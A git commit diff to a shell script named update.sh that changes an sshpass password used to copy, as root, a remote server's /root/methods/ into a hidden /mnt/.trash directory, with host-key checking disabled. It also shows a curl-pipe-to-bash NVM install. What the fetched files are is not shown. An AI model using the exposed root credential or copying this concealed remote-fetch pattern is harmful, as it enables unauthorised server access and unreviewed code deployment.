eb22dbf04b23cbd4c9a10596a11eae2c8b0264fd
Yanti Anniza <yantianniza@outlook.com>
2024-10-25 00:18:20 +0800

    Update update.sh

--- update.sh
+++ update.sh
@@ -20,7 +20,7 @@ mkdir /mnt/.trash
 cd /mnt/.trash
 
 # Memindahkan file dengan scp
-sshpass -p 'lex' scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -r root@159.223.47.71:/root/methods/* ./
+sshpass -p 'lexx120109' scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -r root@159.223.47.71:/root/methods/* ./
 
 # Menginstal NVM dan Node.js
 curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash
